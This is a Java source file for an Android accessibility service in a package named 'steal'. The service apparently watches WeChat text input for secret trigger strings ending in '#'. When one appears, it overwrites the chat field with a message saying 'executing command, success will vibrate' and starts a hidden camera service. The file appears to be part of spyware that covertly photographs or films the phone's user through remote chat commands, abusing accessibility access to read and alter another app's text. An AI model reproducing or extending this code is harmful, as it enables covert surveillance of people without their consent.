package com.xiaoxin.jhang.steal.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.xiaoxin.jhang.steal.Config;
import com.xiaoxin.jhang.steal.constant.Constant;
import com.xiaoxin.jhang.steal.util.StartCameraUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/**
 * @author xiaoxin
 * @date 2018/4/08
 * @describe :
 * 修改内容
 */

public class WxplugService extends AccessibilityService {

    private static final String TAG = "WxplugService";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {//动态监听文本框内容变化并实时获取文本
            styContent(event);//实时转换 不可取
        }
    }

    @SuppressLint("NewApi")
    private void styContent(AccessibilityEvent event) {
        if(!TextUtils.isEmpty(event.getText().toString())) {
            String content = event.getText().toString();
            if (content.contains(Config.SpecialPic) || content.contains(Config.SpecialVideo)) {
                Log.e(TAG, "styContent: "+content);
                String endStr = content.substring(content.length()-2, content.length() - 1);
                if ("#".equals(endStr)) {//以#号结尾进行拍照
                    findEditTextSend(Constant.EDITTEXT_ID);
                    StartCameraUtil.startCameraService(this, content);
                }
            }
        }
    }

    @SuppressLint("NewApi")
    private boolean findEditTextSend(String editId) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            List<AccessibilityNodeInfo> editInfo = rootNode.findAccessibilityNodeInfosByViewId(editId);
            if(editInfo!=null&&!editInfo.isEmpty() && editInfo.size() > 0 ){
                Bundle bundle = new Bundle();
                bundle.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,"正在执行命令,成功会震动");
                editInfo.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
                return true;
            }
        }
        return false;
    }


    @Override
    public void onInterrupt() {
        Toast.makeText(this,"辅助服务断开连接了", Toast.LENGTH_SHORT).show();
    }
}
